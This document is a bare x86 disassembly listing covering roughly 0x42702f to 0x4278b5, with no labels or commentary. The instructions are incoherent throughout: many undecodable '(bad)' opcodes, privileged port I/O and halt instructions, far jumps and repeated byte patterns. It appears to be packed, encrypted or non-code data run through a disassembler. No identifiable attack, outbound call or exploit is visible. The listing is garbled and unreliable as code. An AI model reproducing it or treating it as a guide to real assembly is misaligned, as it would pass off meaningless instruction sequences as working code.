  42702f:	jnp    0x427094
  427031:	test   DWORD PTR [ecx],ecx
  427033:	jmp    0x80a3:0x4d4d4d9e
  42703a:	ja     0x427004
  42703c:	push   ebx
  42703d:	mov    dl,0x80
  42703f:	lock enter 0x5ed,0xd
  427044:	stos   DWORD PTR es:[edi],eax
  427045:	les    esp,FWORD PTR [esi+0x538b7780]
  42704b:	mov    dl,0x80
  42704d:	lock mov edx,DWORD PTR [ebx-0x2]
  427051:	mov    dl,0xba
  427053:	sub    DWORD PTR [edx-0x4d00f37a],esi
  427059:	test   eax,0x8d21fb70
  42705e:	xchg   edi,eax
  42705f:	add    BYTE PTR [edi+0x7cc587ed],0x77
  427066:	mov    dh,dh
  427068:	and    al,0x6f
  42706a:	cmp    cl,dh
  42706c:	cmc    
  42706d:	and    al,0x6f
  42706f:	cmp    BYTE PTR [eax-0x69],dl
  427072:	mov    eax,DWORD PTR [eax+0x77501577]
  427078:	adc    eax,0x80157780
  42707d:	int    0x2e
  42707f:	cmp    cl,BYTE PTR [ebp+0x15f0808d]
  427085:	or     BYTE PTR [ebp+0x3a2e5080],0x8d
  42708c:	lea    eax,[eax+0x657dec30]
  427092:	xchg   ebx,eax
  427093:	push   eax
  427094:	lock stc 
  427096:	xor    BYTE PTR [edi-0x76],0x80
  42709a:	lock mov bl,BYTE PTR [ecx+0x10de29b]
  4270a1:	out    0x2f,al
  4270a3:	push   ebx
  4270a4:	jl     0x427058
  4270a6:	xchg   BYTE PTR [ebx+eiz*4],cl
  4270a9:	push   ebx
  4270aa:	adc    DWORD PTR [edx-0x4d00d646],esi
  4270b0:	push   eax
  4270b1:	ja     0x427035
  4270b3:	xor    BYTE PTR [edi-0x76],0x80
  4270b7:	lock mov dl,BYTE PTR [ebx+0x7c]
  4270bb:	mov    dl,0x86
  4270bd:	or     al,0x53
  4270bf:	adc    DWORD PTR [edx-0x4d00d646],esi
  4270c5:	push   eax
  4270c6:	ja     0x42704c
  4270c8:	xor    BYTE PTR [edi-0x7],0x80
  4270cc:	ins    DWORD PTR es:[edi],dx
  4270cd:	or     ch,ch
  4270cf:	xchg   BYTE PTR [ecx],ah
  4270d1:	push   eax
  4270d2:	ja     0x4270cb
  4270d4:	xor    BYTE PTR [edi-0x7],0x80
  4270d8:	ins    DWORD PTR es:[edi],dx
  4270d9:	pop    ebp
  4270da:	xor    al,0xf9
  4270dd:	jge    0x42712e
  4270df:	xchg   edx,eax
  4270e0:	xchg   ebp,eax
  4270e1:	xor    BYTE PTR [edi-0x7],0xd5
  4270e5:	sbb    eax,0x805d6d80
  4270ea:	lock stc 
  4270ec:	cmp    BYTE PTR [edi-0x6b],0x7d
  4270f0:	dec    ebx
  4270f1:	div    DWORD PTR [ebx]
  4270f3:	std    
  4270f4:	xor    BYTE PTR [edi-0x7],0x80
  4270f8:	ins    DWORD PTR es:[edi],dx
  4270f9:	pop    ebp
  4270fa:	in     al,dx
  4270fb:	mov    dl,0xc4
  4270fd:	in     al,dx
  4270fe:	sub    BYTE PTR [ebp-0x6b],0x50
  427102:	ja     0x42708a
  427104:	xor    BYTE PTR [edi-0x76],0x80
  427108:	lock mov dl,BYTE PTR [ebx+0x7c]
  42710c:	push   ebx
  42710d:	adc    DWORD PTR [edx-0x454df37a],esi
  427113:	sub    edi,edi
  427115:	mov    dl,0x50
  427117:	ja     0x42712e
  427119:	xor    BYTE PTR [edi-0x76],0x80
  42711d:	lock mov dl,BYTE PTR [ebx+0x7c]
  427121:	push   ebx
  427122:	adc    DWORD PTR [edx-0x794dd646],esi
  427128:	or     al,0xff
  42712a:	mov    dl,0x50
  42712c:	ja     0x427143
  42712e:	xor    BYTE PTR [edi-0x76],0x80
  427132:	lock mov dl,BYTE PTR [ebx+0x11]
  427136:	push   ebx
  427137:	jl     0x4270eb
  427139:	mov    edx,0xc86b229
  42713e:	push   DWORD PTR [edx+0x5071f080]
  427144:	cmp    dl,BYTE PTR [eax-0x69]
  427147:	adc    eax,0xf415777c
  42714c:	and    al,0x6f
  42714e:	cmp    BYTE PTR [edi+esi*2+0x15],bh
  427152:	repz and al,0x6f
  427155:	cmp    BYTE PTR [edi+esi*2+0x15],bh
  427159:	cli    
  42715a:	and    al,0x6f
  42715c:	cmp    BYTE PTR [esi-0x727290c9],bh
  427162:	xor    BYTE PTR [edi-0x76],0x80
  427166:	lock mov dl,BYTE PTR [ebx+0x7c]
  42716a:	push   ebx
  42716b:	adc    DWORD PTR [edx-0x454df37a],esi
  427171:	sub    edi,edi
  427173:	mov    dl,0x50
  427175:	ja     0x4270fb
  427177:	xor    BYTE PTR [edi-0x7a],0xec
  42717b:	ja     0x42719e
  42717d:	push   eax
  42717e:	ja     0x427102
  427180:	dec    ebp
  427181:	xlat   BYTE PTR ds:[ebx]
  427182:	or     BYTE PTR [ebp-0x29],0x21
  427186:	xor    al,0xf9
  427189:	xchg   BYTE PTR [ecx+0x504d4da8],cl
  42718f:	ja     0x4271a6
  427191:	xor    BYTE PTR [edi+0x15],0x4f
  427195:	push   0xffffffd5
  427197:	(bad)  
  427198:	xor    BYTE PTR [edi-0x7e],0x50
  42719c:	ja     0x427121
  42719e:	xor    BYTE PTR [edi-0x7d],0x80
  4271a2:	lock and DWORD PTR [ebx-0x4e],eax
  4271a6:	push   eax
  4271a7:	ja     0x42712c
  4271a9:	xor    BYTE PTR [edi+0x15],0x80
  4271ad:	lock adc eax,0xec716d80
  4271b3:	xchg   edx,eax
  4271b4:	and    DWORD PTR [eax-0x29c7c10],eax
  4271ba:	in     al,0x19
  4271bc:	xor    BYTE PTR [edi+0x15],0x80
  4271c0:	ins    DWORD PTR es:[edi],dx
  4271c1:	and    DWORD PTR [eax-0x6d13ea10],eax
  4271c7:	out    dx,eax
  4271c8:	xor    al,0x83
  4271cb:	inc    ebx
  4271cc:	mov    dl,0xbe
  4271ce:	and    ch,BYTE PTR [edi]
  4271d0:	lea    ecx,[ebp+0x6f24f6fa]
  4271d6:	cmp    BYTE PTR [eax-0x29],dl
  4271d9:	scas   eax,DWORD PTR es:[edi]
  4271da:	jl     0x427253
  4271dc:	std    
  4271dd:	cmc    
  4271de:	and    al,0x6f
  4271e0:	cmp    BYTE PTR [edi+esi*2+0x76],bh
  4271e4:	hlt    
  4271e5:	and    al,0x6f
  4271e7:	cmp    BYTE PTR [edi+esi*2+0x6a],bh
  4271eb:	repz and al,0x6f
  4271ee:	cmp    BYTE PTR [ecx],al
  4271f0:	ja     0x4271a1
  4271f2:	push   eax
  4271f3:	ja     0x4271bd
  4271f5:	add    DWORD PTR [edi-0x3],esi
  4271f8:	push   eax
  4271f9:	ja     0x42722d
  4271fb:	add    DWORD PTR [edi+0x76],esi
  4271fe:	push   eax
  4271ff:	ja     0x427216
  427201:	add    DWORD PTR [edi+0x6a],esi
  427204:	push   eax
  427205:	ja     0x42718e
  427207:	xor    BYTE PTR [edi-0x76],0x80
  42720b:	lock mov dl,BYTE PTR [ebx+0x7c]
  42720f:	push   ebx
  427210:	adc    DWORD PTR [edx-0x454df37a],esi
  427216:	sub    edi,edi
  427218:	mov    dl,0x50
  42721a:	ja     0x42719f
  42721c:	mov    esi,0x8d8decfe
  427221:	mov    ds:0x6f24f30d,al
  427226:	cmp    BYTE PTR [ecx],cl
  427228:	shld   esp,ebp,0x8d
  42722c:	(bad)  
  42722d:	loop   0x427250
  42722f:	dec    ebp
  427230:	xlat   BYTE PTR ds:[ebx]
  427231:	add    BYTE PTR [ecx],0x77
  427234:	bound  ecx,QWORD PTR [edx]
  427236:	xchg   BYTE PTR [ecx],cl
  427238:	test   al,0x4d
  42723a:	dec    ebp
  42723b:	xor    BYTE PTR [edi-0x75],0x80
  42723f:	lock mov edx,DWORD PTR [ebx+0x7c]
  427243:	push   ebx
  427244:	adc    DWORD PTR [edx-0x794dd646],esi
  42724a:	or     al,0xff
  42724c:	mov    dl,0x50
  42724e:	ja     0x4271d4
  427250:	push   eax
  427251:	xlat   BYTE PTR ds:[ebx]
  427252:	jp     0x4272c2
  427254:	out    0x7a,eax
  427256:	xor    BYTE PTR [edi+0x7a],0xb2
  42725a:	xchg   BYTE PTR [ebx+edx*2],cl
  42725d:	(bad)  
  42725e:	mov    dl,0x2
  427260:	sub    edi,edi
  427262:	xor    dl,BYTE PTR [eax-0x29]
  427265:	add    DWORD PTR [eax-0xf7f7489],0xffffff8b
  42726c:	push   ebx
  42726d:	adc    DWORD PTR [edx+0x7c5329ba],esi
  427273:	mov    dl,0x86
  427275:	or     al,0xff
  427277:	mov    dl,0x80
  427279:	lock mov eax,DWORD PTR [eax+0x2a538b97]
  427280:	push   ebx
  427281:	xchg   esp,eax
  427282:	mov    dl,0xbe
  427284:	or     al,0xb2
  427286:	clc    
  427287:	sub    edi,edi
  427289:	(bad)  
  42728a:	in     al,dx
  42728b:	mov    dl,0x80
  42728d:	lock adc DWORD PTR [eax-0x29],0x66
  427292:	arpl   bp,di
  427294:	xlat   BYTE PTR ds:[ebx]
  427295:	sub    DWORD PTR [eax-0xf7f7489],eax
  42729b:	mov    edx,DWORD PTR [ebx+0x7c]
  42729e:	push   ebx
  42729f:	adc    DWORD PTR [edx-0x454df37a],esi
  4272a5:	sub    edi,edi
  4272a7:	mov    dl,0xa
  4272a9:	loop   0x4272cc
  4272ab:	add    DWORD PTR [edi+0x62],esi
  4272ae:	or     al,BYTE PTR [esi+0x4d4d8a4c]
  4272b4:	xor    BYTE PTR [edi-0x76],0x80
  4272b8:	lock mov dl,BYTE PTR [ebx+0x7c]
  4272bc:	push   ebx
  4272bd:	adc    DWORD PTR [edx-0x794dd646],esi
  4272c3:	or     al,0xff
  4272c5:	mov    dl,0x80
  4272c7:	lock and DWORD PTR [ebx-0x3],0xffffffd5
  4272cc:	sub    DWORD PTR [eax-0xf7f7589],eax
  4272d2:	mov    dl,BYTE PTR [ebx+0x7c]
  4272d5:	push   ebx
  4272d6:	adc    DWORD PTR [edx-0x454df37a],esi
  4272dc:	sub    edi,edi
  4272de:	mov    dl,0xa
  4272e0:	loop   0x427303
  4272e2:	add    DWORD PTR [edi+0x62],esi
  4272e5:	or     al,BYTE PTR [esi+0x4d4d8ac9]
  4272eb:	xor    BYTE PTR [edi-0x38],0x80
  4272ef:	lock enter 0x3080,0x80
  4272f4:	lea    edx,[ebx+0x11]
  4272f7:	push   ebx
  4272f8:	jl     0x4272ac
  4272fa:	mov    edx,0xc86b229
  4272ff:	push   DWORD PTR [edx+0x622f758f]
  427305:	xor    al,0x8a
  427308:	adc    BYTE PTR [edi+0x532a538a],0x94
  42730f:	mov    dl,0xbe
  427311:	or     al,0xb2
  427313:	clc    
  427314:	sub    DWORD PTR [ecx],ecx
  427316:	loopne 0x427382
  427318:	(bad)  
  427319:	(bad)  
  42731a:	arpl   WORD PTR [edx+0xca20f09],si
  427320:	lea    ecx,[ebp-0x7fcd8880]
  427326:	lock xor al,BYTE PTR [eax+0x538d8030]
  42732d:	adc    DWORD PTR [ebx+0x7c],edx
  427330:	mov    dl,0xba
  427332:	sub    DWORD PTR [edx-0x4d00f37a],esi
  427338:	(bad)  
  427339:	jne    0x42736a
  42733b:	bound  eax,QWORD PTR [eax-0x687f7510]
  427341:	mov    dl,BYTE PTR [ebx+0x2a]
  427344:	push   ebx
  427345:	xchg   esp,eax
  427346:	mov    dl,0xbe
  427348:	or     al,0xb2
  42734a:	clc    
  42734b:	sub    DWORD PTR [ecx],ecx
  42734d:	loopne 0x4273b9
  42734f:	(bad)  
  427350:	(bad)  
  427351:	arpl   WORD PTR [edx+0xcda0f09],si
  427357:	lea    ecx,[ebp-0x7fea8880]
  42735d:	lock adc eax,0x8d803080
  427363:	push   ebx
  427364:	adc    DWORD PTR [ebx+0x7c],edx
  427367:	mov    dl,0xba
  427369:	sub    DWORD PTR [edx-0x4d00f37a],esi
  42736f:	(bad)  
  427370:	jne    0x4273a1
  427372:	bound  eax,QWORD PTR [eax-0x687f7510]
  427378:	mov    dl,BYTE PTR [ebx+0x2a]
  42737b:	push   ebx
  42737c:	xchg   esp,eax
  42737d:	mov    dl,0xbe
  42737f:	or     al,0xb2
  427381:	clc    
  427382:	sub    DWORD PTR [ecx],ecx
  427384:	loopne 0x4273f0
  427386:	(bad)  
  427387:	(bad)  
  427388:	arpl   WORD PTR [edx+0xc130f09],si
  42738e:	lea    ecx,[ebp-0x7f788880]
  427394:	lock xchg DWORD PTR [eax+0x538d8030],eax
  42739b:	adc    DWORD PTR [ebx+0x7c],edx
  42739e:	mov    dl,0xba
  4273a0:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4273a6:	(bad)  
  4273a7:	jne    0x4273d8
  4273a9:	bound  eax,QWORD PTR [eax-0x687f7510]
  4273af:	mov    dl,BYTE PTR [ebx+0x2a]
  4273b2:	push   ebx
  4273b3:	xchg   esp,eax
  4273b4:	mov    dl,0xbe
  4273b6:	or     al,0xb2
  4273b8:	clc    
  4273b9:	sub    DWORD PTR [ecx],ecx
  4273bb:	loopne 0x427427
  4273bd:	(bad)  
  4273be:	(bad)  
  4273bf:	arpl   WORD PTR [edx+0x3a830f09],si
  4273c5:	lea    ecx,[ebp-0x7fcd8880]
  4273cb:	lock xor al,BYTE PTR [eax+0x538d8030]
  4273d2:	adc    DWORD PTR [edx+0x7c5329ba],esi
  4273d8:	mov    dl,0x86
  4273da:	or     al,0xff
  4273dc:	mov    dl,0x8f
  4273de:	jne    0x42740f
  4273e0:	bound  eax,QWORD PTR [eax+0x3080c8f0]
  4273e6:	adc    BYTE PTR [edi+0x539080c8],0x2a
  4273ed:	mov    dl,0xbe
  4273ef:	or     al,0x53
  4273f1:	xchg   esp,eax
  4273f2:	mov    dl,0xf8
  4273f4:	sub    edi,edi
  4273f6:	dec    BYTE PTR [edi-0x2b9d30cf]
  4273fc:	mov    dl,0x80
  4273fe:	lock adc eax,0x97803080
  427404:	adc    eax,0x2a539080
  427409:	mov    dl,0xbe
  42740b:	or     al,0x53
  42740d:	xchg   esp,eax
  42740e:	mov    dl,0xf8
  427410:	sub    edi,edi
  427412:	dec    BYTE PTR [edi-0x599d30cf]
  427418:	mov    dl,0x80
  42741a:	lock enter 0x3080,0x80
  42741f:	xchg   edi,eax
  427420:	enter  0x9080,0x53
  427424:	sub    dl,BYTE PTR [ebx-0x6c]
  427427:	mov    dl,0xbe
  427429:	or     al,0xb2
  42742b:	clc    
  42742c:	sub    edi,edi
  42742e:	dec    BYTE PTR [edi-0x29a930cf]
  427434:	std    
  427435:	or     DWORD PTR [edi-0x43],ecx
  427438:	cmp    cl,BYTE PTR [ebp+0x1577808d]
  42743e:	xor    al,0x15
  427441:	xor    BYTE PTR [eax],0x80
  427444:	lea    edx,[ebx+0x11]
  427447:	mov    dl,0xba
  427449:	sub    DWORD PTR [ebx+0x7c],edx
  42744c:	mov    dl,0x86
  42744e:	or     al,0xff
  427450:	mov    dl,0x8f
  427452:	jne    0x427483
  427454:	bound  eax,QWORD PTR [eax+0x308032f0]
  42745a:	adc    BYTE PTR [edi+0x53908032],0x2a
  427461:	mov    dl,0xbe
  427463:	or     al,0x53
  427465:	xchg   esp,eax
  427466:	mov    dl,0xf8
  427468:	sub    edi,edi
  42746a:	dec    BYTE PTR [edi-0x2b9d30cf]
  427470:	mov    dl,0x80
  427472:	lock xchg DWORD PTR [eax-0x78687fd0],eax
  427479:	adc    BYTE PTR [eax-0x414dd5ad],0xc
  427480:	push   ebx
  427481:	xchg   esp,eax
  427482:	mov    dl,0xf8
  427484:	sub    edi,edi
  427486:	dec    BYTE PTR [edi-0x599d30cf]
  42748c:	mov    dl,0x80
  42748e:	lock xor al,BYTE PTR [eax+0x32978030]
  427495:	adc    BYTE PTR [eax-0x6bacd5ad],0xb2
  42749c:	mov    esi,0x29f8b20c
  4274a1:	(bad)  
  4274a2:	dec    BYTE PTR [edi-0x29a930cf]
  4274a8:	std    
  4274a9:	or     DWORD PTR [edi-0x38],ecx
  4274ac:	lea    ecx,[ebp-0x78887f73]
  4274b2:	xor    al,0x87
  4274b5:	xor    BYTE PTR [eax],0x80
  4274b8:	lea    edx,[ebx+0x11]
  4274bb:	mov    dl,0xba
  4274bd:	sub    DWORD PTR [ebx+0x7c],edx
  4274c0:	mov    dl,0x86
  4274c2:	or     al,0xff
  4274c4:	mov    dl,0x8f
  4274c6:	jne    0x4274f7
  4274c8:	bound  eax,QWORD PTR [eax+0x308015f0]
  4274ce:	adc    BYTE PTR [edi+0x53908015],0x2a
  4274d5:	mov    dl,0xbe
  4274d7:	or     al,0x53
  4274d9:	xchg   esp,eax
  4274da:	mov    dl,0xf8
  4274dc:	sub    edi,edi
  4274de:	dec    BYTE PTR [edi-0x2b9d30cf]
  4274e4:	mov    dl,0x80
  4274e6:	lock enter 0x3080,0x80
  4274eb:	xchg   edi,eax
  4274ec:	enter  0x9080,0x53
  4274f0:	sub    dh,BYTE PTR [edx-0x6bacf342]
  4274f6:	mov    dl,0xf8
  4274f8:	sub    edi,edi
  4274fa:	dec    BYTE PTR [edi-0x599d30cf]
  427500:	mov    dl,0x80
  427502:	lock adc eax,0x97803080
  427508:	adc    eax,0x2a539080
  42750d:	push   ebx
  42750e:	xchg   esp,eax
  42750f:	mov    dl,0xbe
  427511:	or     al,0xb2
  427513:	clc    
  427514:	sub    edi,edi
  427516:	dec    BYTE PTR [edi-0x29a930cf]
  42751c:	std    
  42751d:	or     DWORD PTR [edi-0x33],ecx
  427520:	lea    ecx,[ebp-0x78887f73]
  427526:	xor    al,0x87
  427529:	xor    BYTE PTR [eax],0x80
  42752c:	lea    edx,[ebx+0x11]
  42752f:	mov    dl,0xba
  427531:	sub    DWORD PTR [ebx+0x7c],edx
  427534:	mov    dl,0x86
  427536:	or     al,0xff
  427538:	mov    dl,0x8f
  42753a:	jne    0x42756b
  42753c:	bound  eax,QWORD PTR [eax+0x3080c8f0]
  427542:	adc    BYTE PTR [edi+0x539080c8],0x2a
  427549:	mov    dl,0xbe
  42754b:	or     al,0x53
  42754d:	xchg   esp,eax
  42754e:	mov    dl,0xf8
  427550:	sub    edi,edi
  427552:	dec    BYTE PTR [edi-0x2b9d30cf]
  427558:	mov    dl,0x80
  42755a:	lock xor al,BYTE PTR [eax+0x32978030]
  427561:	adc    BYTE PTR [eax-0x414dd5ad],0xc
  427568:	push   ebx
  427569:	xchg   esp,eax
  42756a:	mov    dl,0xf8
  42756c:	sub    edi,edi
  42756e:	dec    BYTE PTR [edi-0x599d30cf]
  427574:	mov    dl,0x80
  427576:	lock xchg DWORD PTR [eax-0x78687fd0],eax
  42757d:	adc    BYTE PTR [eax-0x6bacd5ad],0xb2
  427584:	mov    esi,0x29f8b20c
  427589:	(bad)  
  42758a:	dec    BYTE PTR [edi-0x29a930cf]
  427590:	std    
  427591:	xlat   BYTE PTR ds:[ebx]
  427592:	jno    0x427595
  427594:	ja     0x4275f8
  427596:	or     al,BYTE PTR [esi+0x4d4dac84]
  42759c:	xor    al,0x5e
  42759f:	arpl   WORD PTR [edx+0x778017d5],si
  4275a5:	mov    al,BYTE PTR [eax+0x11538af0]
  4275ab:	push   ebx
  4275ac:	jl     0x427560
  4275ae:	mov    edx,0xc86b229
  4275b3:	push   DWORD PTR [edx-0x7f7b88b0]
  4275b9:	ja     0x427546
  4275bb:	adc    bh,0x8b
  4275be:	xor    BYTE PTR [edi-0x75],0x80
  4275c2:	lock mov edx,DWORD PTR [ebx+0x4b]
  4275c6:	push   ebx
  4275c7:	je     0x42757b
  4275c9:	mov    BYTE PTR [edx+esi*4],cl
  4275cc:	test   BYTE PTR [ecx],ch
  4275ce:	push   DWORD PTR [edx]
  4275d0:	in     al,dx
  4275d1:	xlat   BYTE PTR ds:[ebx]
  4275d2:	data16 xor BYTE PTR [edi+0x7a],0x53
  4275d7:	sub    ch,ch
  4275d9:	mov    edx,0x8a84ed8a
  4275de:	mov    dl,0x88
  4275e0:	sub    esp,ebp
  4275e2:	std    
  4275e3:	inc    DWORD PTR ds:0x24f60ba2
  4275e9:	outs   dx,DWORD PTR ds:[esi]
  4275ea:	cmp    BYTE PTR [eax-0xf7f7589],al
  4275f0:	mov    dl,BYTE PTR [ebx+0x11]
  4275f3:	push   ebx
  4275f4:	jl     0x4275a8
  4275f6:	mov    edx,0xc86b229
  4275fb:	push   DWORD PTR [edx+0x6384f080]
  427601:	std    
  427602:	or     DWORD PTR [edi],ecx
  427604:	pop    ds
  427605:	mov    cl,BYTE PTR [ebp+0x4d]
  427608:	xor    BYTE PTR [edi-0x76],0x80
  42760c:	lock mov dl,BYTE PTR [ebx+0x7c]
  427610:	push   ebx
  427611:	adc    DWORD PTR [edx-0x794dd646],esi
  427617:	or     al,0xff
  427619:	mov    dl,0x80
  42761b:	lock test BYTE PTR [ebx-0x3],ah
  42761f:	xlat   BYTE PTR ds:[ebx]
  427620:	sbb    eax,DWORD PTR [eax-0xf7f7489]
  427626:	mov    edx,DWORD PTR [ebx+0x7c]
  427629:	push   ebx
  42762a:	adc    DWORD PTR [edx-0x454df37a],esi
  427630:	sub    edi,edi
  427632:	mov    dl,0xbe
  427634:	jg     0x427670
  427636:	lea    ecx,[ebp-0x6656da1e]
  42763c:	dec    ebp
  42763d:	xlat   BYTE PTR ds:[ebx]
  42763e:	add    BYTE PTR [ecx],0x77
  427641:	push   ss
  427642:	or     al,BYTE PTR [esi+0x4d4da00c]
  427648:	xor    BYTE PTR [edi-0x76],0x80
  42764c:	lock mov dl,BYTE PTR [ebx+0x7c]
  427650:	push   ebx
  427651:	adc    DWORD PTR [edx-0x794dd646],esi
  427657:	or     al,0xff
  427659:	mov    dl,0x80
  42765b:	lock and DWORD PTR [ebx-0x4e],0xffffffd5
  427660:	xchg   ebx,eax
  427661:	xor    BYTE PTR [edi-0x75],0x80
  427665:	lock mov edx,DWORD PTR [ebx+0x7c]
  427669:	push   ebx
  42766a:	adc    DWORD PTR [edx-0x794dd646],esi
  427670:	or     al,0xff
  427672:	mov    dl,0x80
  427674:	lock and DWORD PTR [ebx-0x4e],0xffffffd5
  427679:	daa    
  42767a:	xor    BYTE PTR [edi-0x75],0x80
  42767e:	lock mov edx,DWORD PTR [ebx+0x7c]
  427682:	push   ebx
  427683:	adc    DWORD PTR [edx-0x454df37a],esi
  427689:	sub    edi,edi
  42768b:	mov    dl,0xa
  42768d:	cdq    
  42768e:	add    DWORD PTR [edi+0x16],esi
  427691:	or     al,BYTE PTR [esi+0x4d4d8b34]
  427697:	xor    BYTE PTR [edi-0x76],0x80
  42769b:	lock mov dl,BYTE PTR [ebx+0x7c]
  42769f:	push   ebx
  4276a0:	adc    DWORD PTR [edx-0x454df37a],esi
  4276a6:	sub    edi,edi
  4276a8:	mov    dl,0xa
  4276aa:	cdq    
  4276ab:	add    DWORD PTR [edi+0x16],esi
  4276ae:	or     al,BYTE PTR [esi+0x4d4d8b4c]
  4276b4:	xor    BYTE PTR [edi-0x7e],0xec
  4276b8:	cld    
  4276b9:	push   eax
  4276ba:	ja     0x4276d1
  4276bc:	dec    ebp
  4276bd:	xlat   BYTE PTR ds:[ebx]
  4276be:	ds dec ebp
  4276c0:	xlat   BYTE PTR ds:[ebx]
  4276c1:	adc    eax,0xec367780
  4276c6:	ja     0x4276b7
  4276c8:	or     al,BYTE PTR [esi+0x4d4d82e5]
  4276ce:	xor    BYTE PTR [edi-0x76],0x80
  4276d2:	lock mov dl,BYTE PTR [ebx+0x7c]
  4276d6:	push   ebx
  4276d7:	adc    DWORD PTR [edx-0x794dd646],esi
  4276dd:	or     al,0xff
  4276df:	mov    dl,0x80
  4276e1:	lock and DWORD PTR [ebx-0x4e],0xffffffd5
  4276e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4276e7:	xor    BYTE PTR [edi-0x75],0x80
  4276eb:	lock mov edx,DWORD PTR [ebx+0x7c]
  4276ef:	push   ebx
  4276f0:	adc    DWORD PTR [edx-0x794dd646],esi
  4276f6:	or     al,0xff
  4276f8:	mov    dl,0x80
  4276fa:	lock and DWORD PTR [ebx-0x4e],0xffffffd5
  4276ff:	rol    BYTE PTR [eax-0xf7f7489],0x8b
  427706:	push   ebx
  427707:	jl     0x4276bb
  427709:	xchg   BYTE PTR [ebx+edx*2],cl
  42770c:	adc    DWORD PTR [edx-0x4d00d646],esi
  427712:	or     cl,BYTE PTR [ebp-0x29]
  427715:	xor    BYTE PTR ds:[edi+0x36],0xec
  42771a:	ja     0x42770b
  42771c:	or     al,BYTE PTR [esi+0x4d4d8b1d]
  427722:	xor    BYTE PTR [edi-0x76],0x80
  427726:	lock mov dl,BYTE PTR [ebx+0x7c]
  42772a:	mov    dl,0x86
  42772c:	or     al,0x53
  42772e:	adc    DWORD PTR [edx-0x4d00d646],esi
  427734:	or     cl,BYTE PTR [ebp-0x29]
  427737:	xor    BYTE PTR ds:[edi+0x36],0xec
  42773c:	ja     0x42772d
  42773e:	or     al,BYTE PTR [esi+0x4d4d4b0b]
  427744:	xor    al,0x46
  427747:	xor    BYTE PTR [edi+0x46],0x53
  42774b:	je     0x4277a0
  42774d:	sub    dh,BYTE PTR [edx-0x7b4df342]
  427753:	sub    edi,edi
  427755:	mov    dl,0x80
  427757:	lock cs push ebx
  42775a:	mov    dl,0x40
  42775c:	lea    edi,[edx]
  42775e:	lea    ecx,[ebp-0x72c8ea2b]
  427764:	int    0x8d
  427766:	lea    ecx,[edx]
  427768:	dec    ebp
  427769:	xlat   BYTE PTR ds:[ebx]
  42776a:	ds adc bh,0x36
  42776e:	in     al,dx
  42776f:	xlat   BYTE PTR ds:[ebx]
  427770:	out    dx,eax
  427771:	xchg   BYTE PTR [esi-0x7fb2b258],bl
  427777:	ja     0x4277ea
  427779:	xor    al,0x3e
  42777c:	cmp    ch,bh
  42777e:	xor    BYTE PTR [edi+0x3e],0xec
  427782:	ja     0x42770a
  427784:	push   eax
  427785:	ja     0x42770d
  427787:	xor    BYTE PTR [edi-0x75],0x80
  42778b:	lock mov edx,DWORD PTR [ebx+0x11]
  42778f:	mov    dl,0xba
  427791:	sub    DWORD PTR [ebx+0x7c],edx
  427794:	mov    dl,0x86
  427796:	or     al,0xff
  427798:	mov    dl,0x80
  42779a:	lock xchg BYTE PTR [ecx],cl
  42779d:	and    dh,BYTE PTR [edx-0x7f750f80]
  4277a3:	xchg   edi,eax
  4277a4:	mov    dl,BYTE PTR [ebx+0x2a]
  4277a7:	push   ebx
  4277a8:	xchg   esp,eax
  4277a9:	mov    dl,0xbe
  4277ab:	or     al,0xb2
  4277ad:	clc    
  4277ae:	sub    edi,edi
  4277b0:	(bad)  
  4277b1:	in     al,dx
  4277b2:	lock mul DWORD PTR [ebx-0x4e]
  4277b6:	or     edx,ebp
  4277b8:	hlt    
  4277b9:	retf   
  4277ba:	dec    ebp
  4277bb:	dec    ebp
  4277bc:	xor    BYTE PTR [edi-0x11],0xab
  4277c0:	test   eax,0x71fb70a3
  4277c5:	lea    edx,[edi-0x78127880]
  4277cb:	adc    eax,0x539b9993
  4277d0:	push   0xffffff80
  4277d2:	ja     0x427809
  4277d4:	or     ch,0x2e
  4277d7:	cmp    cl,BYTE PTR [ebp-0x10687f73]
  4277dd:	or     BYTE PTR [ebp-0x7fde2880],0xe7
  4277e4:	out    dx,eax
  4277e5:	and    BYTE PTR [edi-0x7588afdf],0x60
  4277ec:	fistp  DWORD PTR [eax-0x21]
  4277ef:	adc    DWORD PTR [ebx-0x4a],edx
  4277f2:	pop    esi
  4277f3:	xchg   BYTE PTR [edi+0x32532643],cl
  4277f9:	or     DWORD PTR [esi-0x3e],eax
  4277fc:	or     al,0xb2
  4277fe:	mov    esp,0x8d4ba229
  427803:	lea    ecx,[ebp+0xc88b2cd]
  427809:	push   ebx
  42780a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42780b:	dec    DWORD PTR [ebx-0x80]
  42780e:	out    0x1d,eax
  427810:	call   DWORD PTR [ebx+eiz*2+0x6313d79c]
  427817:	(bad)  
  427818:	xlat   BYTE PTR ds:[ebx]
  427819:	or     DWORD PTR [edx-0x54881f31],esp
  42781f:	push   esi
  427820:	sar    ebx,cl
  427822:	adc    al,0x62
  427824:	mov    esi,0x8d8d3a9c
  427829:	adc    BYTE PTR [edi+0x15d78071],0x80
  427830:	xchg   edi,eax
  427831:	out    dx,eax
  427832:	adc    bh,0x21
  427835:	adc    BYTE PTR [edi+0x21d780ef],0x80
  42783c:	out    0xef,eax
  42783e:	and    BYTE PTR [edi+0x53325321],0xb6
  427845:	or     DWORD PTR [esi-0x3e],eax
  427848:	or     al,0xb2
  42784a:	mov    esp,0x8d4ba229
  42784f:	lea    ecx,[ebp-0x5bac33]
  427855:	xchg   esp,eax
  427856:	mov    dl,0x88
  427858:	or     al,0xff
  42785a:	dec    ebx
  42785b:	and    bh,0x71
  42785e:	and    BYTE PTR [edi-0x7f7daceb],0x77
  427865:	jno    0x4278ba
  427867:	retf   
  427868:	xor    al,0x15
  42786b:	or     DWORD PTR [esi-0x54],eax
  42786e:	or     al,0xb2
  427870:	test   BYTE PTR [ecx],ch
  427872:	push   ebx
  427873:	jo     0x427874
  427875:	retf   
  427876:	push   edi
  427877:	lea    ecx,[ebp-0x3b4d3273]
  42787d:	or     al,0xff
  42787f:	add    BYTE PTR [eax-0x63131089],0x13
  427886:	mov    BYTE PTR [eax+0x21d78051],0x80
  42788d:	out    0x71,eax
  42788f:	and    BYTE PTR [edi-0x757b12eb],0xed
  427896:	mov    esp,0x29beb28a
  42789b:	push   ebx
  42789c:	jb     0x4278f5
  42789e:	aad    0x58
  4278a0:	fist   WORD PTR [ecx]
  4278a2:	mov    ds:0x438f860b,al
  4278a7:	mov    es:0xdf58d54b,al
  4278ad:	adc    DWORD PTR [edx+0x438f86c6],esp
  4278b3:	es in  al,dx
  4278b5:	jl     0x4278ca
